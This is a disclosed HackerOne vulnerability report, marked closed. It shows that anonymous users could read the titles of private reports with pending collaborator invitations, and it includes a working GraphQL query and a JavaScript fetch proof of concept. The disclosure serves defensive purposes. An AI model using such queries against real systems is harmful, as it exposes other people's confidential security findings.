# View Titles of Private Reports with pending email invitation

## Report Details
- **Report ID**: 2312029
- **URL**: https://hackerone.com/reports/2312029
- **State**: Closed
- **Severity**: high
- **Submitted**: 2024-01-11T06:21:00.074Z
- **Disclosed**: 2024-01-16T09:17:25.182Z

## Reporter
- **Username**: ahacker1
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**

If a private report has a pending email invitation for collaboration, an anonymous user can see the title of the report.
This only works for anonymous users, and the collaboration invitation must be through Manage Collaborators invitation panel.

**Description:**

### Steps To Reproduce

1. As victim:
In a report to a bug bounty program, add a collaborator, using any email, such as: ██████████
Save the integer ID of the report.

2. In a new, **anonymous/unauthenticated/logged-out** session:
Send GraphQL request, replacing PRIVATE_REPORT_ID integer:
```graphql
{
  report(id:IPRIVATE_REPORT_ID){
    title
  }
}
```
OR run JS implementation:
By visiting hackerone.com/hacktivity as anonymous:
```js
const csrf_token = document.getElementsByName("csrf-token")[0].getAttribute("content")
const REPORT_ID = PRIVATE_REPORT_ID // integer

var resp = await(await fetch("https://hackerone.com/graphql", {
  "headers": {
    "accept": "*/*",
    "content-type": "application/json",
    "x-csrf-token": csrf_token,
  },
  "body": JSON.stringify({
    "operationName": "HacktivitySearchQuery",
    "variables": {
        "reportId": REPORT_ID
    },
    "query": `query HacktivitySearchQuery($reportId: Int!) {
  report(id: $reportId){
    id
    url
    title
  }
}
`
}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
})).json()
console.log(resp.data.report)
```
The title of the report is the response, confirming the vulnerability.

## Impact

Can read titles of possibly unfixed reports. This can be leveraged against the program, depending on the specificity of the title in the report.

## Attachments
No attachments
